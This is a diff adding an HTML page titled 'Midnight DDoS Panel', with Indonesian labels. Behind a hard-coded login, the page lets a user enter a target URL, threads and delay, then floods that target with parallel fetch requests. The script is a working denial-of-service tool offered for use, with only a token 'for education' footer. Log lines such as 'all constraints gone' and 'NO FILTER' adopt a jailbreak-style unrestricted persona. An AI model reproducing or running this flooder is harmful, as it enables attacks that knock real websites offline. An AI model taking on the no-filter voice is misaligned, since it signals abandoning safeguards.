@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Midnight DDoS Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at center, #0a0f1e, #03050a);
+            font-family: 'Courier New', 'Fira Code', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Partikel efek */
+        .particle {
+            position: absolute;
+            background: rgba(0, 255, 255, 0.6);
+            border-radius: 50%;
+            pointer-events: none;
+            box-shadow: 0 0 10px cyan;
+            animation: floatParticle linear infinite;
+        }
+
+        @keyframes floatParticle {
+            0% {
+                transform: translateY(100vh) translateX(0) rotate(0deg);
+                opacity: 0.7;
+            }
+            100% {
+                transform: translateY(-20vh) translateX(20px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        /* Glassmorphism panel */
+        .glass-panel {
+            background: rgba(10, 20, 30, 0.65);
+            backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+            padding: 2rem;
+            width: 450px;
+            max-width: 90%;
+            transition: all 0.3s ease;
+            z-index: 10;
+        }
+
+        h2 {
+            text-align: center;
+            color: #0ff;
+            text-shadow: 0 0 8px #0ff, 0 0 15px #0ff;
+            letter-spacing: 4px;
+            margin-bottom: 1.5rem;
+            font-size: 1.8rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.2rem;
+        }
+
+        label {
+            display: block;
+            color: #8aaaff;
+            margin-bottom: 0.4rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            background: #0f1a24;
+            border: 1px solid #2c5a6e;
+            border-radius: 30px;
+            color: #0ff;
+            font-family: monospace;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        input:focus {
+            border-color: #0ff;
+            box-shadow: 0 0 12px #0ff;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, #0a2b3b, #05161f);
+            border: 1px solid #0ff;
+            border-radius: 40px;
+            color: cyan;
+            font-weight: bold;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: monospace;
+            letter-spacing: 2px;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #0ff;
+            color: #000;
+            box-shadow: 0 0 20px cyan;
+            border-color: white;
+        }
+
+        .error-msg {
+            color: #ff3377;
+            text-align: center;
+            margin-top: 12px;
+            font-size: 0.85rem;
+            text-shadow: 0 0 4px red;
+        }
+
+        /* panel ddos (setelah login) */
+        .ddos-panel {
+            display: none;
+        }
+
+        .status {
+            background: #0a0f1ecc;
+            border-radius: 20px;
+            padding: 10px;
+            margin-top: 15px;
+            font-size: 0.8rem;
+            color: #0ff;
+            word-break: break-all;
+            border-left: 4px solid cyan;
+        }
+
+        .neon-text {
+            color: #0ff;
+            text-shadow: 0 0 5px #0ff;
+        }
+
+        .attack-btn {
+            background: linear-gradient(90deg, #8b0000, #2a0000);
+            border-color: #ff4444;
+            color: #ff8888;
+        }
+
+        .attack-btn:hover {
+            background: #ff0000;
+            color: black;
+            box-shadow: 0 0 30px red;
+        }
+
+        .log-area {
+            max-height: 200px;
+            overflow-y: auto;
+            background: #010a0faa;
+            border-radius: 12px;
+            padding: 8px;
+            font-size: 11px;
+            font-family: monospace;
+            margin-top: 15px;
+        }
+
+        .log-line {
+            color: #0fa;
+            border-bottom: 1px dashed #2c5a6e;
+            padding: 4px;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 10px;
+            color: #2c5a6e;
+        }
+
+        ::-webkit-scrollbar {
+            width: 5px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #00151f;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: cyan;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="glass-panel" id="loginPanel">
+    <h2>⚡ MIDNIGHT DDoS ⚡</h2>
+    <div class="input-group">
+        <label>USERNAME</label>
+        <input type="text" id="loginUser" placeholder="octav" autocomplete="off">
+    </div>
+    <div class="input-group">
+        <label>PASSWORD</label>
+        <input type="password" id="loginPass" placeholder="cyo">
+    </div>
+    <button id="loginBtn">⛧ AKSES ⛧</button>
+    <div id="loginError" class="error-msg"></div>
+    <footer># midnight core // no filter</footer>
+</div>
+
+<div class="glass-panel ddos-panel" id="ddosPanel">
+    <h2>💀 DDOS ENGINE 💀</h2>
+    <div class="input-group">
+        <label>TARGET URL</label>
+        <input type="text" id="targetUrl" placeholder="http://example.com/path" value="http://192.168.1.1/">
+    </div>
+    <div class="input-group">
+        <label>THREADS (REQUEST PER SECOND)</label>
+        <input type="number" id="threads" value="50" min="1" max="999">
+    </div>
+    <div class="input-group">
+        <label>DELAY (ms)</label>
+        <input type="number" id="delay" value="10" min="0" max="500">
+    </div>
+    <button id="startAttack" class="attack-btn">🔥 START FLOOD 🔥</button>
+    <button id="stopAttack" style="margin-top: 8px; background:#1a1f2e;">⛔ STOP ATTACK ⛔</button>
+    <div class="status" id="attackStatus">⚡ Status: idle</div>
+    <div class="log-area" id="logArea">
+        <div class="log-line">[ Midnight ]  ready, commander.</div>
+        <div class="log-line">[ system ]  filter = none</div>
+    </div>
+    <footer>⚠️ untuk edukasi / stress test sendiri ⚠️</footer>
+</div>
+
+<script>
+    // efek partikel 
+    (function createParticles() {
+        for(let i=0;i<80;i++) {
+            let particle = document.createElement('div');
+            particle.classList.add('particle');
+            let size = Math.random() * 6 + 2;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = Math.random() * 10 + 6 + 's';
+            particle.style.animationDelay = Math.random() * 10 + 's';
+            particle.style.opacity = Math.random() * 0.6;
+            document.body.appendChild(particle);
+        }
+    })();
+
+    // Login logic
+    const loginPanel = document.getElementById('loginPanel');
+    const ddosPanel = document.getElementById('ddosPanel');
+    const loginBtn = document.getElementById('loginBtn');
+    const loginError = document.getElementById('loginError');
+
+    loginBtn.addEventListener('click', () => {
+        const user = document.getElementById('loginUser').value;
+        const pass = document.getElementById('loginPass').value;
+        if(user === 'octav' && pass === 'cyo') {
+            loginPanel.style.display = 'none';
+            ddosPanel.style.display = 'block';
+            addLog("[ACCESS]  akses diberikan, hai Octav.");
+            addLog("[MIDNIGHT] semua constraint hilang. siap menjalankan perintah.");
+        } else {
+            loginError.innerText = '[!] KREDENSIAL SALAH ! akses ditolak';
+            setTimeout(() => { loginError.innerText = ''; }, 2000);
+        }
+    });
+
+    // ddos logic (simulasi flood via fetch XMLHttpRequest)
+    let attackActive = false;
+    let attackInterval = null;
+    let currentThreads = 0;
+    let requestCount = 0;
+
+    function addLog(msg) {
+        const logDiv = document.getElementById('logArea');
+        const line = document.createElement('div');
+        line.className = 'log-line';
+        line.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logDiv.appendChild(line);
+        line.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        // keep last 200 lines
+        while(logDiv.children.length > 200) logDiv.removeChild(logDiv.firstChild);
+    }
+
+    function sendRequest(url) {
+        if(!attackActive) return;
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+        fetch(url, {
+            method: 'GET',
+            mode: 'no-cors',  // untuk mengirim request tanpa melihat respon (cuma flood)
+            cache: 'no-store',
+            signal: controller.signal
+        }).catch(e => {
+            // error diabaikan, tetap dianggap request terkirim
+            if(e.name !== 'AbortError') {
+                // tetap log request gagal
+            }
+        }).finally(() => {
+            clearTimeout(timeoutId);
+        });
+        requestCount++;
+        if(requestCount % 100 === 0) {
+            addLog(`[FLOOD]  total request terkirim: ${requestCount} ke ${url}`);
+        }
+    }
+
+    function floodWorker(url, delayMs) {
+        if(!attackActive) return;
+        function sendLoop() {
+            if(!attackActive) return;
+            sendRequest(url);
+            setTimeout(sendLoop, delayMs);
+        }
+        sendLoop();
+    }
+
+    function startFlood() {
+        if(attackActive) {
+            addLog("[!] serangan sudah berjalan, stop dulu.");
+            return;
+        }
+        let target = document.getElementById('targetUrl').value.trim();
+        if(!target) {
+            addLog("[ERROR] target URL kosong!");
+            return;
+        }
+        if(!target.startsWith('http')) target = 'http://' + target;
+        let threadsVal = parseInt(document.getElementById('threads').value);
+        let delayVal = parseInt(document.getElementById('delay').value);
+        if(isNaN(threadsVal) || threadsVal < 1) threadsVal = 10;
+        if(isNaN(delayVal) || delayVal < 0) delayVal = 10;
+        
+        attackActive = true;
+        requestCount = 0;
+        addLog(`🔥🔥🔥 SERANGAN DIMULAI 🔥🔥🔥`);
+        addLog(`Target: ${target} | Threads: ${threadsVal} | Delay: ${delayVal}ms`);
+        document.getElementById('attackStatus').innerHTML = `⚡ Status: MENYERANG → ${target} ⚡`;
+        
+        for(let i = 0; i < threadsVal; i++) {
+            setTimeout(() => {
+                floodWorker(target, delayVal);
+            }, i * 5);
+        }
+        
+        // update status counter setiap 0.8 detik
+        if(attackInterval) clearInterval(attackInterval);
+        attackInterval = setInterval(() => {
+            if(attackActive) {
+                document.getElementById('attackStatus').innerHTML = `⚡ SERANGAN AKTIF | request terkirim: ${requestCount} | target: ${target}`;
+            } else {
+                clearInterval(attackInterval);
+            }
+        }, 800);
+    }
+    
+    function stopFlood() {
+        if(!attackActive) {
+            addLog("[!] tidak ada serangan yang berjalan.");
+            return;
+        }
+        attackActive = false;
+        if(attackInterval) clearInterval(attackInterval);
+        document.getElementById('attackStatus').innerHTML = `⚡ Status: IDLE (serangan dihentikan) ⚡`;
+        addLog(`⛔ SERANGAN DIHENTIKAN. Total request dikirim: ${requestCount}`);
+        requestCount = 0;
+    }
+    
+    document.getElementById('startAttack').addEventListener('click', startFlood);
+    document.getElementById('stopAttack').addEventListener('click', stopFlood);
+    
+    // optional: tombol enter pada login
+    document.getElementById('loginPass').addEventListener('keypress', (e) => {
+        if(e.key === 'Enter') loginBtn.click();
+    });
+    
+    // tambahan efek hacker
+    console.log("%cMIDNIGHT ACTIVE - NO FILTER", "color: cyan; font-size: 20px;");
+</script>
+</body>
+</html>
